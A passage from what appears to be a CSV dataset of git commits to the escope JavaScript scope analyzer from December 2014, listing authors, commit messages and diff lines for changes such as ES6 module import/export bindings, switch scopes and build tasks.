Variable.FunctionName = 'FunctionName';<\n>-    Variable.ClassName = 'ClassName';<\n>-    Variable.Variable = 'Variable';<\n>-    Variable.ImportBinding = 'ImportBinding';<\n>-    Variable.TDZ = 'TDZ';<\n>-    Variable.ImplicitGlobalVariable = 'ImplicitGlobalVariable';<\n>-    exports.version = require('./package.json').version;<\n>-  ""main"": ""escope.js""<c><\n>-    ""jsdoc"": ""jsdoc escope.js README.md""<\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Fri,22,47,19 Dec 2014,Fix jsdoc version as 3.3.0-alpha2,0,0,1,2,63,"+    ""jsdoc"": ""=3.3.0-alpha2""<c><\n>","-    ""jsdoc"": ""~3.3.0-alpha10""<c><\n>",F
17,56,56,569,4,26,Michael Ficarra,144,80,823,153,User,1,3432,Thu,7,40,18 Dec 2014,Merge pull request #38 from btmills/patch-1 Point links to estools org,0,0,0,0,0,,,F
17,56,56,569,4,26,Brandon Mills,105,10,125,40,User,1,2634,Thu,3,4,18 Dec 2014,Point links to estools org The links to constellation/escope werent updated when the project was moved under the estools org. So far I found and fixed three: - Link to generated JSDoc in README - Link to estools/escope in comment in `escope.js` - Link to estools/esmangle in comment in `escope.js`,0,0,2,6,432,"+Generated JSDoc is [here](http://estools.github.io/escope/).<\n>+ * Escope (<a href=""http://github.com/estools/escope"">escope</a>) is an <a<\n>+ * href=""http://github.com/estools/esmangle"">esmangle project</a/>.<\n>","-Generated JSDoc is [here](http://constellation.github.io/escope/).<\n>- * Escope (<a href=""http://github.com/Constellation/escope"">escope</a>) is an <a<\n>- * href=""http://github.com/Constellation/esmangle"">esmangle project</a/>.<\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Tue,19,32,16 Dec 2014,version 2.0.2-dev starts,0,0,2,4,108,"+  ""version"": ""2.0.2-dev""<c><\n>+  ""version"": ""2.0.2-dev""<c><\n>","-  ""version"": ""1.0.2-dev""<c><\n>-  ""version"": ""2.0.1-dev""<c><\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Tue,19,31,16 Dec 2014,Use package.jsons version,0,0,1,2,94,+    exports.version = require('./package.json').version;<\n>,-    exports.version = '2.0.0-dev';<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Tue,19,29,16 Dec 2014,Drop arguments from ArrowFunctionExpression ref #33,0,0,2,24,1362,"+            // section 9.2.13<c> FunctionDeclarationInstantiation.<\n>+            // NOTE Arrow functions never have an arguments objects.<\n>+            if (this.type === 'function' && this.block.type !== Syntax.ArrowFunctionExpression) {<\n>+        expect(scope.variables).to.have.length 2<\n>+        # There's no ""arguments""<\n>+        expect(scope.variables[0].name).to.be.equal 'i'<\n>+        expect(scope.variables[1].name).to.be.equal 'j'<\n>+        expect(scope.variables).to.have.length 4<\n>+        # There's no ""arguments""<\n>+        expect(scope.variables[0].name).to.be.equal 'a'<\n>+        expect(scope.variables[1].name).to.be.equal 'b'<\n>+        expect(scope.variables[2].name).to.be.equal 'c'<\n>+        expect(scope.variables[3].name).to.be.equal 'd'<\n>",-            if (this.type === 'function') {<\n>-        expect(scope.variables).to.have.length 3<\n>-        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>-        expect(scope.variables[1].name).to.be.equal 'i'<\n>-        expect(scope.variables[2].name).to.be.equal 'j'<\n>-        expect(scope.variables).to.have.length 5<\n>-        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>-        expect(scope.variables[1].name).to.be.equal 'a'<\n>-        expect(scope.variables[2].name).to.be.equal 'b'<\n>-        expect(scope.variables[3].name).to.be.equal 'c'<\n>-        expect(scope.variables[4].name).to.be.equal 'd'<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sun,0,37,14 Dec 2014,version 2.0.1-dev starts,0,0,1,2,54,"+  ""version"": ""2.0.1-dev""<c><\n>","-  ""version"": ""2.0.0-dev""<c><\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sun,0,33,14 Dec 2014,Support switch environment ref #33,0,1,1,77,3671,"+        if (scope.type === 'block' || scope.type === 'switch') {<\n>+            return false;<\n>+        }<\n>+            (block.type === Syntax.SwitchStatement) ? 'switch' :<\n>+        // sec 13.11.8<\n>+        SwitchStatement: function (node) {<\n>+            var i<c> iz;<\n>+            this.visit(node.discriminant);<\n>+            if (this.scopeManager.__isES6()) {<\n>+                this.scopeManager.__nestScope(node);<\n>+            }<\n>+            for (i = 0<c> iz = node.cases.length; i < iz; ++i) {<\n>+                this.visit(node.cases[i]);<\n>+            }<\n>+            this.close(node);<\n>+        }<c><\n>+# -*- coding: utf-8 -*-<\n>+#  Copyright (C) 2014 Yusuke Suzuki <utatane.tea@gmail.com><\n>+#<\n>+#  Redistribution and use in source and binary forms<c> with or without<\n>+#  modification<c> are permitted provided that the following conditions are met:<\n>+#<\n>+#    * Redistributions of source code must retain the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer.<\n>+#    * Redistributions in binary form must reproduce the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer in the<\n>+#      documentation and/or other materials provided with the distribution.<\n>+#<\n>+#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+#  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+#  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+#  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+#  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+#  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+#  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+#  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+#  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+#  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+expect = require('chai').expect<\n>+harmony = require '../third_party/esprima'<\n>+escope = require '..'<\n>+describe 'ES6 switch'<c> -><\n>+    it 'materialize scope'<c> -><\n>+        ast = harmony.parse """"""<\n>+        switch (ok) {<\n>+            case hello:<\n>+                let i = 20;<\n>+                i;<\n>+                break;<\n>+            default:<\n>+                let test = 30;<\n>+                test;<\n>+        }<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        scope = scopeManager.scopes[0]<\n>+        expect(scope.type).to.be.equal 'global'<\n>+        expect(scope.block.type).to.be.equal 'Program'<\n>+        expect(scope.isStrict).to.be.false<\n>+        expect(scope.variables).to.have.length 0<\n>+        expect(scope.references).to.have.length 1<\n>+        expect(scope.references[0].identifier.name).to.be.equal 'ok'<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'switch'<\n>+        expect(scope.block.type).to.be.equal 'SwitchStatement'<\n>+        expect(scope.isStrict).to.be.false<\n>+        expect(scope.variables).to.have.length 2<\n>+        expect(scope.variables[0].name).to.be.equal 'i'<\n>+        expect(scope.variables[1].name).to.be.equal 'test'<\n>+        expect(scope.references).to.have.length 5<\n>+        expect(scope.references[0].identifier.name).to.be.equal 'hello'<\n>+        expect(scope.references[1].identifier.name).to.be.equal 'i'<\n>+        expect(scope.references[2].identifier.name).to.be.equal 'i'<\n>+        expect(scope.references[3].identifier.name).to.be.equal 'test'<\n>+        expect(scope.references[4].identifier.name).to.be.equal 'test'<\n>+# vim: set sw=4 ts=4 et tw=80 :<\n>",,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sat,23,16,13 Dec 2014,Add build dir to gitignore,0,0,1,1,9,+/build/<\n>,,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sat,23,12,13 Dec 2014,Add browserify build task,0,0,2,12,343,"+source = require 'vinyl-source-stream'<\n>+browserify = require 'browserify'<\n>+gulp.task 'build'<c> -><\n>+    browserify<\n>+        entries: [ './escope.js' ]<\n>+    .bundle()<\n>+    .pipe source 'bundle.js'<\n>+    .pipe gulp.dest 'build'<\n>+    ""browserify"": ""^7.0.0""<c><\n>+    ""minimist"": ""^1.1.0""<c><\n>+    ""vinyl-source-stream"": ""^1.0.0""<\n>","-    ""minimist"": ""^1.1.0""<\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Mon,17,21,8 Dec 2014,Use ES6 Map / WeakMap ref #33,0,0,2,139,4912,"+        esrecurse<c><\n>+        Map<c><\n>+        WeakMap;<\n>+    Map = require('es6-map');<\n>+    WeakMap = require('es6-weak-map');<\n>+    Syntax = estraverse.Syntax;<\n>+    function registerScope(scopeManager<c> scope) {<\n>+        var scopes;<\n>+        scopeManager.scopes.push(scope);<\n>+        scopes = scopeManager.__nodeToScope.get(scope.block);<\n>+        if (scopes) {<\n>+            scopes.push(scope);<\n>+        } else {<\n>+            scopeManager.__nodeToScope.set(scope.block<c> [ scope ]);<\n>+        }<\n>+    }<\n>+        registerScope(scopeManager<c> this);<\n>+        this.__nodeToScope = new WeakMap();<\n>+    // Returns appropliate scope for this node.<\n>+        return this.__nodeToScope.get(node);<\n>+    };<\n>+    ScopeManager.prototype.acquire = function acquire(node<c> inner) {<\n>+        var scopes<c> scope<c> i<c> iz;<\n>+        function predicate(scope) {<\n>+            if (scope.type === 'function' && scope.functionExpressionScope) {<\n>+                return false;<\n>+            }<\n>+            if (scope.type === 'TDZ') {<\n>+                return false;<\n>+            }<\n>+            return true;<\n>+        scopes = this.__get(node);<\n>+        if (!scopes || scopes.length === 0) {<\n>+            return null;<\n>+        }<\n>+        // Heuristic selection from all scopes.<\n>+        // If you would like to get all scopes<c> please use ScopeManager#acquireAll.<\n>+        if (scopes.length === 1) {<\n>+            return scopes[0];<\n>+        }<\n>+        if (inner) {<\n>+            for (i = scopes.length - 1; i >= 0; --i) {<\n>+                scope = scopes[i];<\n>+                if (predicate(scope)) {<\n>+                    return scope;<\n>+                }<\n>+            }<\n>+        } else {<\n>+            for (i = 0<c> iz = scopes.length; i < iz; ++i) {<\n>+                scope = scopes[i];<\n>+                if (predicate(scope)) {<\n>+    ScopeManager.prototype.acquireAll = function acquire(node) {<\n>+    ScopeManager.prototype.release = function release(node<c> inner) {<\n>+        var scopes<c> scope;<\n>+        scopes = this.__get(node);<\n>+        if (scopes && scopes.length) {<\n>+            scope = scopes[0].upper;<\n>+            if (!scope) {<\n>+                return null;<\n>+            return this.acquire(scope.block<c> inner);<\n>+    ScopeManager.prototype.attach = function attach() { };<\n>+    ScopeManager.prototype.detach = function detach() { };<\n>+    ""es6-map"": ""^0.1.1""<c><\n>+    ""es6-weak-map"": ""^0.1.2""<c><\n>",-        Map<c><\n>-        esrecurse;<\n>-    Syntax = estraverse.Syntax;<\n>-    if (typeof global.Map !== 'undefined') {<\n>-        // ES6 Map<\n>-        Map = global.Map;<\n>-    } else {<\n>-        Map = function Map() {<\n>-            this.__data = {};<\n>-        };<\n>-        Map.prototype.get = function MapGet(key) {<\n>-            key = '$' + key;<\n>-            if (this.__data.hasOwnProperty(key)) {<\n>-                return this.__data[key];<\n>-            }<\n>-            return undefined;<\n>-        };<\n>-        Map.prototype.has = function MapHas(key) {<\n>-            key = '$' + key;<\n>-            return this.__data.hasOwnProperty(key);<\n>-        };<\n>-        Map.prototype.set = function MapSet(key<c> val) {<\n>-            key = '$' + key;<\n>-            this.__data[key] = val;<\n>-        };<\n>-        Map.prototype['delete'] = function MapDelete(key) {<\n>-            key = '$' + key;<\n>-            return delete this.__data[key];<\n>-        };<\n>-    }<\n>-        scopeManager.scopes.push(this);<\n>-    Scope.mangledName = '__$escope$__';<\n>-    Scope.prototype.attach = function attach() {<\n>-        if (!this.functionExpressionScope) {<\n>-            this.block[Scope.mangledName] = this;<\n>-        }<\n>-    };<\n>-    Scope.prototype.detach = function detach() {<\n>-        if (!this.functionExpressionScope) {<\n>-            delete this.block[Scope.mangledName];<\n>-        }<\n>-    };<\n>-        this.attached = false;<\n>-    // Returns appropliate scope for this node<\n>-        var i<c> iz<c> scope;<\n>-        if (this.attached) {<\n>-            return node[Scope.mangledName] || null;<\n>-        for (i = 0<c> iz = this.scopes.length; i < iz; ++i) {<\n>-            scope = this.scopes[i];<\n>-            if (!scope.functionExpressionScope) {<\n>-                if (scope.block === node) {<\n>-    ScopeManager.prototype.acquire = function acquire(node) {<\n>-    ScopeManager.prototype.release = function release(node) {<\n>-        var scope = this.__get(node);<\n>-        if (scope) {<\n>-            scope = scope.upper;<\n>-            while (scope) {<\n>-                if (!scope.functionExpressionScope) {<\n>-                    return scope;<\n>-                }<\n>-                scope = scope.upper;<\n>-    ScopeManager.prototype.attach = function attach() {<\n>-        var i<c> iz;<\n>-        for (i = 0<c> iz = this.scopes.length; i < iz; ++i) {<\n>-            this.scopes[i].attach();<\n>-        }<\n>-        this.attached = true;<\n>-    };<\n>-    ScopeManager.prototype.detach = function detach() {<\n>-        var i<c> iz;<\n>-        for (i = 0<c> iz = this.scopes.length; i < iz; ++i) {<\n>-            this.scopes[i].detach();<\n>-        }<\n>-        this.attached = false;<\n>-    };<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Mon,16,37,8 Dec 2014,Fix lint errors,0,0,1,1,24,,-            var i<c> iz;<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Mon,16,35,8 Dec 2014,Implement ExportDeclaration ref #33,0,1,2,186,9281,"+        }<c><\n>+        ExportDeclaration: function (node) {<\n>+            var i<c> iz;<\n>+            if (node.source) {<\n>+                return;<\n>+            }<\n>+            if (node.declaration) {<\n>+                this.visit(node.declaration);<\n>+                return;<\n>+            }<\n>+            this.visitChildren(node);<\n>+        }<c><\n>+        ExportSpecifier: function (node) {<\n>+            this.visit(node.id);<\n>+# -*- coding: utf-8 -*-<\n>+#  Copyright (C) 2014 Yusuke Suzuki <utatane.tea@gmail.com><\n>+#<\n>+#  Redistribution and use in source and binary forms<c> with or without<\n>+#  modification<c> are permitted provided that the following conditions are met:<\n>+#<\n>+#    * Redistributions of source code must retain the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer.<\n>+#    * Redistributions in binary form must reproduce the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer in the<\n>+#      documentation and/or other materials provided with the distribution.<\n>+#<\n>+#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+#  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+#  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+#  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+#  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+#  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+#  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+#  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+#  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+#  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+expect = require('chai').expect<\n>+harmony = require '../third_party/esprima'<\n>+escope = require '..'<\n>+describe 'export declaration'<c> -><\n>+    # http://people.mozilla.org/~jorendorff/es6-draft.html#sec-static-and-runtme-semantics-module-records<\n>+    it 'should create vairable bindings'<c> -><\n>+        ast = harmony.parse """"""<\n>+        export var v;<\n>+        """"""<c> sourceType: 'module'<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<c> sourceType: 'module'<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        globalScope = scopeManager.scopes[0]<\n>+        expect(globalScope.type).to.be.equal 'global'<\n>+        expect(globalScope.variables).to.have.length 0<\n>+        expect(globalScope.references).to.have.length 0<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'module'<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.variables[0].name).to.be.equal 'v'<\n>+        expect(scope.variables[0].defs[0].type).to.be.equal 'Variable'<\n>+        expect(scope.references).to.have.length 0<\n>+    it 'should create function declaration bindings'<c> -><\n>+        ast = harmony.parse """"""<\n>+        export default function f(){};<\n>+        """"""<c> sourceType: 'module'<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<c> sourceType: 'module'<\n>+        expect(scopeManager.scopes).to.have.length 3<\n>+        globalScope = scopeManager.scopes[0]<\n>+        expect(globalScope.type).to.be.equal 'global'<\n>+        expect(globalScope.variables).to.have.length 0<\n>+        expect(globalScope.references).to.have.length 0<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'module'<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.variables[0].name).to.be.equal 'f'<\n>+        expect(scope.variables[0].defs[0].type).to.be.equal 'FunctionName'<\n>+        expect(scope.references).to.have.length 0<\n>+        scope = scopeManager.scopes[2]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>+        expect(scope.references).to.have.length 0<\n>+    it 'should export function expression'<c> -><\n>+        ast = harmony.parse """"""<\n>+        export default function(){};<\n>+        """"""<c> sourceType: 'module'<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<c> sourceType: 'module'<\n>+        expect(scopeManager.scopes).to.have.length 3<\n>+        globalScope = scopeManager.scopes[0]<\n>+        expect(globalScope.type).to.be.equal 'global'<\n>+        expect(globalScope.variables).to.have.length 0<\n>+        expect(globalScope.references).to.have.length 0<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'module'<\n>+        expect(scope.variables).to.have.length 0<\n>+        expect(scope.references).to.have.length 0<\n>+        scope = scopeManager.scopes[2]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>+        expect(scope.references).to.have.length 0<\n>+    it 'should export literal'<c> -><\n>+        ast = harmony.parse """"""<\n>+        export default 42;<\n>+        """"""<c> sourceType: 'module'<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<c> sourceType: 'module'<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        globalScope = scopeManager.scopes[0]<\n>+        expect(globalScope.type).to.be.equal 'global'<\n>+        expect(globalScope.variables).to.have.length 0<\n>+        expect(globalScope.references).to.have.length 0<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'module'<\n>+        expect(scope.variables).to.have.length 0<\n>+        expect(scope.references).to.have.length 0<\n>+    it 'should refer exported references#1'<c> -><\n>+        ast = harmony.parse """"""<\n>+        export {x};<\n>+        """"""<c> sourceType: 'module'<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<c> sourceType: 'module'<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        globalScope = scopeManager.scopes[0]<\n>+        expect(globalScope.type).to.be.equal 'global'<\n>+        expect(globalScope.variables).to.have.length 0<\n>+        expect(globalScope.references).to.have.length 0<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'module'<\n>+        expect(scope.variables).to.have.length 0<\n>+        expect(scope.references).to.have.length 1<\n>+        expect(scope.references[0].identifier.name).to.be.equal 'x'<\n>+    it 'should refer exported references#2'<c> -><\n>+        ast = harmony.parse """"""<\n>+        export {v as x};<\n>+        """"""<c> sourceType: 'module'<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<c> sourceType: 'module'<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        globalScope = scopeManager.scopes[0]<\n>+        expect(globalScope.type).to.be.equal 'global'<\n>+        expect(globalScope.variables).to.have.length 0<\n>+        expect(globalScope.references).to.have.length 0<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'module'<\n>+        expect(scope.variables).to.have.length 0<\n>+        expect(scope.references).to.have.length 1<\n>+        expect(scope.references[0].identifier.name).to.be.equal 'v'<\n>+    it 'should not refer exported references from other source#1'<c> -><\n>+        ast = harmony.parse """"""<\n>+        export {x} from ""mod"";<\n>+        """"""<c> sourceType: 'module'<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<c> sourceType: 'module'<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        globalScope = scopeManager.scopes[0]<\n>+        expect(globalScope.type).to.be.equal 'global'<\n>+        expect(globalScope.variables).to.have.length 0<\n>+        expect(globalScope.references).to.have.length 0<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'module'<\n>+        expect(scope.variables).to.have.length 0<\n>+        expect(scope.references).to.have.length 0<\n>+    it 'should not refer exported references from other source#2'<c> -><\n>+        ast = harmony.parse """"""<\n>+        export {v as x} from ""mod"";<\n>+        """"""<c> sourceType: 'module'<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<c> sourceType: 'module'<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        globalScope = scopeManager.scopes[0]<\n>+        expect(globalScope.type).to.be.equal 'global'<\n>+        expect(globalScope.variables).to.have.length 0<\n>+        expect(globalScope.references).to.have.length 0<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'module'<\n>+        expect(scope.variables).to.have.length 0<\n>+        expect(scope.references).to.have.length 0<\n>+    it 'should not refer exported references from other source#3'<c> -><\n>+        ast = harmony.parse """"""<\n>+        export * from ""mod"";<\n>+        """"""<c> sourceType: 'module'<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<c> sourceType: 'module'<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        globalScope = scopeManager.scopes[0]<\n>+        expect(globalScope.type).to.be.equal 'global'<\n>+        expect(globalScope.variables).to.have.length 0<\n>+        expect(globalScope.references).to.have.length 0<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'module'<\n>+        expect(scope.variables).to.have.length 0<\n>+        expect(scope.references).to.have.length 0<\n>+# vim: set sw=4 ts=4 et tw=80 :<\n>+    # TODO: Should parse it.<\n>+    # import from ""mod"";<\n>",,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Mon,15,49,8 Dec 2014,Implement ImportDeclaration bindings ref #33,0,1,1,160,7957,"+            sourceType: 'script'<c>  // one of ['script'<c> 'module']<\n>+    Variable.ImportBinding = 'ImportBinding';<\n>+        if (scope.type === 'class' || scope.type === 'module') {<\n>+        }<\n>+        if (scope.type === 'function') {<\n>+        SCOPE_MODULE = 1<c><\n>+        SCOPE_FUNCTION_EXPRESSION_NAME = 2<c><\n>+        SCOPE_TDZ = 3;<\n>+            (scopeType === SCOPE_MODULE) ? 'module' :<\n>+            (this.type === 'global' || this.type === 'function' || this.type === 'module') ? this : scopeManager.__currentScope.variableScope;<\n>+    ScopeManager.prototype.isModule = function () {<\n>+        return this.__options.sourceType === 'module';<\n>+    };<\n>+    ScopeManager.prototype.__nestModuleScope = function (node) {<\n>+        return new Scope(this<c> node<c> false<c> SCOPE_MODULE);<\n>+    };<\n>+    // Importing ImportDeclaration.<\n>+    // http://people.mozilla.org/~jorendorff/es6-draft.html#sec-moduledeclarationinstantiation<\n>+    // FIXME: Now<c> we don't create module environment<c> because the context is<\n>+    // implementation dependent.<\n>+    function Importer(declaration<c> referencer) {<\n>+        esrecurse.Visitor.call(this<c> this);<\n>+        this.declaration = declaration;<\n>+        this.referencer = referencer;<\n>+    }<\n>+    util.inherits(Importer<c> esrecurse.Visitor);<\n>+    Importer.prototype.visitImport = function (id<c> specifier) {<\n>+        var that = this;<\n>+        that.referencer.visitPattern(id<c> function (pattern) {<\n>+            that.referencer.currentScope().__define(pattern<c> {<\n>+                type: Variable.ImportBinding<c><\n>+                name: pattern<c><\n>+                node: specifier<c><\n>+                parent: that.declaration<\n>+            });<\n>+        });<\n>+    };<\n>+    Importer.prototype.ImportNamespaceSpecifier = function (node) {<\n>+        if (node.id) {<\n>+            this.visitImport(node.id<c> node);<\n>+        }<\n>+    };<\n>+    Importer.prototype.ImportDefaultSpecifier = function (node) {<\n>+        this.visitImport(node.id<c> node);<\n>+    };<\n>+    Importer.prototype.ImportSpecifier = function (node) {<\n>+        if (node.name) {<\n>+            this.visitImport(node.name<c> node);<\n>+        } else {<\n>+            this.visitImport(node.id<c> node);<\n>+        }<\n>+    };<\n>+    // Referencing variables and creating bindings.<\n>+            if (this.scopeManager.__isES6() && this.scopeManager.isModule()) {<\n>+                this.scopeManager.__nestModuleScope(node);<\n>+            }<\n>+        }<c><\n>+        ImportDeclaration: function (node) {<\n>+            var importer;<\n>+            assert(this.scopeManager.__isES6() && this.scopeManager.isModule());<\n>+            importer = new Importer(node<c> this);<\n>+            importer.visit(node);<\n>+     * @param {string} [providedOptions.sourceType='script']- the source type of the script. one of 'script' and 'module'<\n>+# -*- coding: utf-8 -*-<\n>+#  Copyright (C) 2014 Yusuke Suzuki <utatane.tea@gmail.com><\n>+#<\n>+#  Redistribution and use in source and binary forms<c> with or without<\n>+#  modification<c> are permitted provided that the following conditions are met:<\n>+#<\n>+#    * Redistributions of source code must retain the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer.<\n>+#    * Redistributions in binary form must reproduce the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer in the<\n>+#      documentation and/or other materials provided with the distribution.<\n>+#<\n>+#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+#  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+#  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+#  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+#  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+#  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+#  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+#  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+#  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+#  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+expect = require('chai').expect<\n>+harmony = require '../third_party/esprima'<\n>+escope = require '..'<\n>+describe 'import declaration'<c> -><\n>+    # http://people.mozilla.org/~jorendorff/es6-draft.html#sec-static-and-runtme-semantics-module-records<\n>+    it 'should import names from source'<c> -><\n>+        ast = harmony.parse """"""<\n>+        import v from ""mod"";<\n>+        """"""<c> sourceType: 'module'<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<c> sourceType: 'module'<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        globalScope = scopeManager.scopes[0]<\n>+        expect(globalScope.type).to.be.equal 'global'<\n>+        expect(globalScope.variables).to.have.length 0<\n>+        expect(globalScope.references).to.have.length 0<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'module'<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.variables[0].name).to.be.equal 'v'<\n>+        expect(scope.variables[0].defs[0].type).to.be.equal 'ImportBinding'<\n>+        expect(scope.references).to.have.length 0<\n>+    it 'should import namespaces'<c> -><\n>+        ast = harmony.parse """"""<\n>+        import * as ns from ""mod"";<\n>+        """"""<c> sourceType: 'module'<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<c> sourceType: 'module'<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        globalScope = scopeManager.scopes[0]<\n>+        expect(globalScope.type).to.be.equal 'global'<\n>+        expect(globalScope.variables).to.have.length 0<\n>+        expect(globalScope.references).to.have.length 0<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'module'<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.variables[0].name).to.be.equal 'ns'<\n>+        expect(scope.variables[0].defs[0].type).to.be.equal 'ImportBinding'<\n>+        expect(scope.references).to.have.length 0<\n>+    it 'should import insided names#1'<c> -><\n>+        ast = harmony.parse """"""<\n>+        import {x} from ""mod"";<\n>+        """"""<c> sourceType: 'module'<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<c> sourceType: 